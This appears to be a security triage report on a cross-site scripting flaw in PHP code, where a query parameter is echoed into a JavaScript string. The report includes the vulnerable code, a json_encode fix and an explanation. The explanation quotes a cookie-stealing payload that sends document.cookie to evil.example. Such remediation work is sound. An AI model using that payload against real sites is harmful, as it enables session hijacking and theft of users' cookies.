## Verdict

exploitable (confidence: high)

## Source

`$_GET['agent_note']` (line 7) - attacker-controlled, read via the query string with no validation and no default beyond the empty-string fallback.

## Fix

Vulnerable code (line 27-30):

```php
<script>
    // SAST FINDING: CWE-79 (Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')) reported here. Sink is the next statement.
    var agentNote = '<?php echo $agentNote; ?>';
    document.getElementById('banner').innerText = 'Agent note: ' + agentNote;
</script>
```

Fixed code:

```php
<script>
    var agentNote = <?php echo json_encode($agentNote, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT); ?>;
    document.getElementById('banner').innerText = 'Agent note: ' + agentNote;
</script>
```

## Explanation

`$agentNote` is echoed verbatim inside a single-quoted JavaScript string literal. Because PHP performs no context-aware encoding at this sink, a value such as `';document.location='//evil.example/?c='+document.cookie;var x='` closes the literal early and runs as arbitrary script the moment the browser parses the page - well before `innerText` is ever reached, so the fact the value is later assigned to `innerText` (which does not interpret HTML) offers no protection here. The fix uses `json_encode()` with `JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT`, per the PHP CWE-79 guidance for JavaScript-context output: it produces a fully quoted, escaped JSON string literal where `<`, `>`, `&`, `'`, and `"` are all rendered as `\uXXXX` escapes, so the value can only ever be a JS string, never a break out of one. The surrounding single quotes from the original code are removed because `json_encode()` already emits its own enclosing double quotes.

## Behaviour changes

- The literal's surrounding quote characters change from single (`'...'`) to double (`"..."`), and the string is now encoded per the JSON spec rather than passed through raw. This is required to close the sink and has no observable effect on the assigned value: `agentNote` still holds the same JS string content once the browser evaluates the literal.
- If `agentNote` contains a malformed byte sequence that is not valid UTF-8 (only possible via unusual manual query-string construction, since normal browser navigation URL-encodes the value), `json_encode()` returns `false` instead of a string, and the emitted script becomes `var agentNote = false;` rather than the raw invalid bytes. This fails closed - no injected payload can render - and is judged an acceptable trade-off versus the injection risk of leaving the value unencoded; call out to the developer if strict preservation of malformed input is required.
- No other arguments, return values, or control flow were changed; `innerText` usage on the next line is unmodified since it was never part of the vulnerable sink.
